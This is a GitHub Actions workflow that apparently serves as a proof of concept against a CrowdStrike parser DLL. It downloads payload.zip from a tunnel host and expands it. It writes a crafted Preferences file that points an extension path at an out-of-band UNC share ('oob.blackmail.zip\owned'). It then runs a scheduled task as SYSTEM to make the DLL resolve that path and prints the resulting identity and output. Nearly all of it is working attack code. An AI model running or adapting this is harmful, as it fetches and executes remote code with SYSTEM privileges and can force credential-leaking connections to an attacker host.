name: beparser-native-unc-proof
on:
  workflow_dispatch:
jobs:
  proof:
    runs-on: windows-2022
    timeout-minutes: 10
    steps:
      - name: Exact DLL native SYSTEM UNC resolution proof
        shell: powershell
        run: |
          $ErrorActionPreference = "Stop"
          New-Item -ItemType Directory -Force C:/beparser/profile | Out-Null
          Invoke-WebRequest -Headers @{"X-Pinggy-No-Screen"="true"} -Uri "https://gmdxb-2600-1f18-68f7-2200-aca3-a18d-1711-1005.run.pinggy-free.link/payload.zip" -OutFile C:/beparser/payload.zip
          Expand-Archive -Path C:/beparser/payload.zip -DestinationPath C:/beparser -Force
          $unc = "\\j9adzdnyijwvlprf--besystem1787400987.oob.blackmail.zip\owned"
          $obj = @{extensions=@{settings=@{bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=@{path=$unc;state=1}}}}
          $json = $obj | ConvertTo-Json -Depth 8 -Compress
          [System.IO.File]::WriteAllText("C:/beparser/profile/Preferences", $json, (New-Object System.Text.UTF8Encoding($false)))
          Write-Output "PREFERENCES=$json"
          @'
          @echo off
          whoami > C:\beparser\identity.txt
          "C:\beparser\profile_harness_native.exe" "C:\beparser\CsBEParser.dll" "C:\beparser\profile" > C:\beparser\system.out 2> C:\beparser\system.err
          echo %ERRORLEVEL% > C:\beparser\system.code
          '@ | Set-Content -Encoding ASCII C:/beparser/run.cmd
          schtasks /Create /TN CrowdStrikeResearchBEParser /TR C:\beparser\run.cmd /SC ONCE /ST 23:59 /RU SYSTEM /RL HIGHEST /F
          schtasks /Run /TN CrowdStrikeResearchBEParser
          for ($i=0; $i -lt 60; $i++) {
            if (Test-Path C:/beparser/system.code) { break }
            Start-Sleep -Seconds 2
          }
          Write-Output "MARKER=besystem1787400987"
          Write-Output "UNC=$unc"
          Write-Output "--- identity ---"
          if (Test-Path C:/beparser/identity.txt) { Get-Content C:/beparser/identity.txt }
          Write-Output "--- stdout ---"
          if (Test-Path C:/beparser/system.out) { Get-Content C:/beparser/system.out }
          Write-Output "--- stderr ---"
          if (Test-Path C:/beparser/system.err) { Get-Content C:/beparser/system.err }
          Write-Output "--- exit ---"
          if (Test-Path C:/beparser/system.code) { Get-Content C:/beparser/system.code }
          schtasks /Delete /TN CrowdStrikeResearchBEParser /F
